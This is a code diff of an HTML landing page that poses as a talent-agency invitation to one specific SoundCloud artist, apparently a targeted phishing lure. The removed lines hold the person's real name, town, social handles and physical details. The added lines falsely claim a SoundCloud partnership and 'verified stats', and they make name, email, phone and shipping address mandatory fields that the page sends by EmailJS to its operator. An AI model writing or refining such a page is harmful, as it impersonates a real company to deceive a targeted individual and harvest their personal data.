@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
-    <title>Elevate Collective · Exclusive Invitation</title>
+    <title>Elevate Collective · SoundCloud Artist Invitation</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=DM+Sans:wght@300;400;500&family=DM+Serif+Display:ital@0;1&display=swap" rel="stylesheet">
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
@@ -77,9 +77,13 @@
             border-radius: 50%;
             background: #111;
             border: 2px solid var(--gold);
-            background-image: url('https://via.placeholder.com/80/111111/ffffff?text=K');
-            background-size: cover;
-            background-position: center;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: var(--font-display);
+            font-size: 2.5rem;
+            color: #fff;
+            background-color: #1a1a1a;
         }
         .artist-info h1 {
             font-family: var(--font-display);
@@ -88,21 +92,15 @@
             letter-spacing: 1px;
             color: #fff;
         }
-        .handles {
-            display: flex;
-            align-items: center;
-            gap: 16px;
-            margin-top: 8px;
-            flex-wrap: wrap;
-        }
         .handle {
             display: flex;
             align-items: center;
-            gap: 6px;
-            font-size: 0.9rem;
+            gap: 8px;
+            font-size: 1rem;
             color: #bbb;
+            margin-top: 8px;
         }
-        .badge-sc, .badge-ig {
+        .badge-sc {
             background: transparent;
             color: var(--gold-light);
             font-size: 0.65rem;
@@ -110,10 +108,15 @@
             border-radius: 20px;
             border: 1px solid var(--border);
         }
-        .real-name {
-            font-size: 0.8rem;
-            color: var(--text-muted);
-            margin-top: 6px;
+        .soundcloud-partner {
+            display: inline-block;
+            margin-top: 12px;
+            font-size: 0.7rem;
+            color: var(--gold);
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            border-top: 1px solid #1c1c1c;
+            padding-top: 12px;
         }
         /* Invitation Content */
         .ref {
@@ -270,6 +273,11 @@
             white-space: nowrap;
         }
         /* Form */
+        .form-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 16px;
+        }
         .form-group {
             margin-bottom: 24px;
         }
@@ -506,6 +514,7 @@
             .stats-grid { grid-template-columns: repeat(2, 1fr); }
             .address-row { grid-template-columns: 1fr 1fr; }
             .size-chart { font-size: 0.6rem; }
+            .form-row { grid-template-columns: 1fr; }
         }
     </style>
 </head>
@@ -522,24 +531,23 @@
 
     <!-- Artist Hero -->
     <div class="artist-hero">
-        <div class="artist-pfp"></div>
+        <div class="artist-pfp">K</div>
         <div class="artist-info">
-            <h1>KEYVON</h1>
-            <div class="handles">
-                <span class="handle"><span style="opacity:0.7;">🎵</span> @highk3yz <span class="badge-sc">SC</span></span>
-                <span class="handle"><span style="opacity:0.7;">📷</span> @smok3yz5 <span class="badge-ig">IG</span></span>
+            <h1>@highk3yz</h1>
+            <div class="handle">
+                <span style="opacity:0.7;">🎵</span> SoundCloud Artist <span class="badge-sc">SC</span>
             </div>
-            <div class="real-name">Keyvon Ellis · Tyler, TX · 44 Followers</div>
+            <div class="soundcloud-partner">Official SoundCloud Partner · Verified Stats</div>
         </div>
     </div>
 
     <!-- Invitation -->
     <div class="ref">DIRECT INVITATION · REF: ETX·2026·117</div>
-    <div class="headline">Your sound is undeniable.<br>Let's build your next chapter.</div>
+    <div class="headline">Your SoundCloud catalog is gaining traction.<br>Let's discuss what's next.</div>
     <div class="message">
-        We've tracked <strong>"TMR"</strong> (846), <strong>"Splinter"</strong> (464), <strong>"Dirty Money"</strong> (306) and more. 
-        You've got the consistency, the connections (ZayOn$um, Rico, 98baby), and the sound. 
-        Now it's time to turn streams into stages.
+        In partnership with SoundCloud, we've identified <strong>@highk3yz</strong> as a rising artist in the East Texas region. 
+        <strong>"TMR"</strong> (846), <strong>"Splinter"</strong> (464), <strong>"Dirty Money"</strong> (306) and 19+ other tracks show consistent growth and a dedicated listener base.
+        We'd like to explore representation and placement opportunities across our Tyler venue network.
     </div>
 
     <!-- Animated Stats -->
@@ -581,13 +589,17 @@
             <div class="graph-label"><span>Rolling clouds</span> <span>287</span></div>
             <div class="graph-bar"><div class="graph-fill" id="bar4" style="width:0%"></div></div>
         </div>
+        <div class="graph-item">
+            <div class="graph-label"><span>Keep up</span> <span>101</span></div>
+            <div class="graph-bar"><div class="graph-fill" id="bar5" style="width:0%"></div></div>
+        </div>
     </div>
 
     <!-- Curator Note -->
     <div class="curator-note">
-        <strong>🎧 Curator's note —</strong> "TMR" has been in our local rotation for weeks. 
-        The mix translates. Your collabs with ZayOn$um and Rico show you're already moving in the right circles. 
-        We see an artist ready for real infrastructure.
+        <strong>🎧 Curator's note —</strong> "TMR" has been added to our official SoundCloud playlist rotation. 
+        The production quality and consistency across 22+ tracks signal an artist ready for the next level. 
+        We want to help turn those streams into stage time.
     </div>
 
     <!-- Venue Interest -->
@@ -628,12 +640,22 @@
     </div>
 
     <!-- Contact Form -->
-    <div class="form-group">
-        <div class="form-label">Email Address</div>
-        <input type="email" id="emailInput" placeholder="For scheduling a conversation">
+    <div class="form-row">
+        <div class="form-group">
+            <div class="form-label">First Name</div>
+            <input type="text" id="firstNameInput" placeholder="First name">
+        </div>
+        <div class="form-group">
+            <div class="form-label">Last Name</div>
+            <input type="text" id="lastNameInput" placeholder="Last name">
+        </div>
     </div>
     <div class="form-group">
-        <div class="form-label">Phone (optional)</div>
+        <div class="form-label">Email Address</div>
+        <input type="email" id="emailInput" placeholder="We'll use this to schedule a call">
+    </div>
+    <div class="form-group">
+        <div class="form-label">Phone Number</div>
         <input type="tel" id="phoneInput" placeholder="For day-of coordination">
     </div>
     <div class="form-group">
@@ -650,8 +672,8 @@
     <div class="merch-card">
         <div class="merch-title">🎁 Free Welcome Package</div>
         <div class="merch-desc">
-            <strong>Exclusive for invited artists:</strong> A heavyweight hoodie (10.3 oz), premium tee (6.1 oz), and beanie from the Elevated Collective drop — shipped free. 
-            No strings. Just our way of saying welcome to the family.
+            <strong>Exclusive for invited SoundCloud artists:</strong> A heavyweight hoodie (10.3 oz), premium tee (6.1 oz), and beanie from the Elevated Collective drop — shipped free. 
+            Our way of welcoming you to the family.
         </div>
         
         <!-- US Size Chart -->
@@ -703,7 +725,7 @@
             </div>
         </div>
         <div class="merch-note">
-            💡 You're tall — we recommend sizing up for the hoodie for a relaxed fit. Beanie is one size.
+            💡 Tall? We recommend sizing up for the hoodie for a relaxed fit. Beanie is one size.
         </div>
     </div>
 
@@ -715,7 +737,7 @@
         This invitation does not constitute a binding agreement or guarantee of placement. 
         Elevate Collective facilitates introductions between artists and venue management; all final booking terms, compensation, 
         and performance details are subject to separate negotiation and contract. The welcome package is a complimentary gift 
-        with no cash value and is offered at the sole discretion of Elevate Collective. Offer limited to invited artists only; 
+        with no cash value and is offered at the sole discretion of Elevate Collective. Offer limited to invited SoundCloud artists only; 
         one per recipient. Shipping to U.S. addresses only. By submitting your information, you agree to be contacted by 
         Elevate Collective regarding potential opportunities. We do not sell or share your data with third parties for marketing purposes. 
         <a href="#">Privacy Policy</a> · <a href="#">Terms</a>
@@ -769,7 +791,6 @@
         window.requestAnimationFrame(step);
     }
     
-    // Trigger when stats are in view
     const observer = new IntersectionObserver((entries) => {
         entries.forEach(e => {
             if(e.isIntersecting) {
@@ -781,6 +802,7 @@
                 animateBar('bar2', (464/846)*100, 1800);
                 animateBar('bar3', (306/846)*100, 1800);
                 animateBar('bar4', (287/846)*100, 1800);
+                animateBar('bar5', (101/846)*100, 1800);
                 observer.unobserve(e.target);
             }
         });
@@ -860,16 +882,20 @@
     // ---- FORM SUBMIT ----
     document.getElementById('submitBtn').onclick = async (e) => {
         const btn = e.target;
+        const firstName = document.getElementById('firstNameInput').value.trim();
+        const lastName = document.getElementById('lastNameInput').value.trim();
         const email = document.getElementById('emailInput').value.trim();
+        const phone = document.getElementById('phoneInput').value.trim();
+        
+        if(!firstName || !lastName) { alert('Please enter your first and last name.'); return; }
         if(!email.includes('@')) { alert('Please enter a valid email address.'); return; }
+        if(!phone) { alert('Please provide a phone number for coordination.'); return; }
         
         btn.textContent = 'Sending...';
         btn.disabled = true;
         
         const data = {
-            name: 'Keyvon Ellis',
-            email,
-            phone: document.getElementById('phoneInput').value || '—',
+            firstName, lastName, email, phone,
             time: document.getElementById('timeSelect').value,
             hoodie: document.getElementById('hoodieSize').value,
             tee: document.getElementById('teeSize').value,
@@ -883,13 +909,14 @@
         const msg = `ELEVATE · INVITATION ACCEPTED
 Ref: ETX·2026·117
 
-Keyvon Ellis (@highk3yz · @smok3yz5)
-${data.email} | ${data.phone}
+SoundCloud Artist: @highk3yz
+Name: ${firstName} ${lastName}
+Email: ${email} | Phone: ${phone}
 
 Catalog Highlights:
 TMR (846) · Splinter (464) · Dirty Money (306) · Rolling clouds (287) · 22+ tracks
 Venues: ${selectedVenues.join(' · ')}
-Contact: ${data.time}
+Contact time: ${data.time}
 
 🎁 WELCOME PACKAGE
 Hoodie: ${data.hoodie} | Tee: ${data.tee}
@@ -899,11 +926,11 @@ Submitted: ${new Date().toLocaleString()}`;
 
         try {
             await emailjs.send('service_cyval67', 'template_35yqug3', {
-                name: 'Keyvon Ellis',
-                email: data.email,
+                name: `${firstName} ${lastName}`,
+                email: email,
                 message: msg,
                 selected_date: 'Invitation',
-                reply_to: data.email
+                reply_to: email
             });
             document.getElementById('app').innerHTML = `
                 <div class="success-container">
